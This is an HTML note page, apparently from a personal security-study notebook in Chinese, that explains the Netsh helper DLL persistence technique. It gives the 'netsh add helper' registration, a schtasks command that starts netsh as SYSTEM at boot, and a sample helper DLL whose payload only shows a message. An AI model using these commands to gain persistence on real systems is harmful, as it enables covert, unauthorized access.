<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Netsh</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Netsh</h1><br/>原理：<br />为netsh添加dll扩展，添加后，下次netsh启动会自动加载<br />注册的 Netsh Helper DLL 的路径会保存到 Windows 注册表中的 HKLM\SOFTWARE\Microsoft\Netsh 路径<br /><br />然后再使用计划任务之类的启动netsh<br />绕一下大概是为了混淆？<br /><br />netsh add helper dll_path<br />schtasks.exe /create /tn &quot;init&quot; /ru SYSTEM /sc ONSTART /tr &quot;C:\windows\system32\netsh.exe&quot;<br /><br />dll代码<br /><div class="codebox"><div class="codebox">BOOL&nbsp;APIENTRY&nbsp;DllMain(&nbsp;HMODULE&nbsp;hModule,<br />&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;ul_reason_for_call,<br />&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;lpReserved<br />&nbsp;&nbsp;&nbsp;&nbsp;)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;switch&nbsp;(ul_reason_for_call)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;DLL_PROCESS_ATTACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;OutputDebugString(_TEXT(&quot;Load&nbsp;DLL~~&quot;));<br />&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;DLL_THREAD_ATTACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;DLL_THREAD_DETACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;DLL_PROCESS_DETACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;TRUE;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;_stdcall&nbsp;NewThreadProc(LPVOID&nbsp;lpParam)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(TRUE)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;OutputDebugString(_TEXT(&quot;Netsh&nbsp;Helper,&nbsp;Hello&nbsp;Topsec&quot;));<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;extern&nbsp;&quot;C&quot;&nbsp;DWORD&nbsp;&nbsp;_stdcall&nbsp;InitHelperDll(DWORD&nbsp;dwNetshVersion,&nbsp;PVOID&nbsp;Reserved)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;CreateThread(NULL,&nbsp;NULL,&nbsp;NewThreadProc,&nbsp;NULL,&nbsp;NULL,&nbsp;NULL);<br />&nbsp;&nbsp;&nbsp;&nbsp;MessageBox(NULL,&nbsp;_TEXT(&quot;Netsh&nbsp;Helper,&nbsp;Hello&nbsp;Topsec&quot;),&nbsp;NULL,&nbsp;MB_OK);<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;NO_ERROR;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>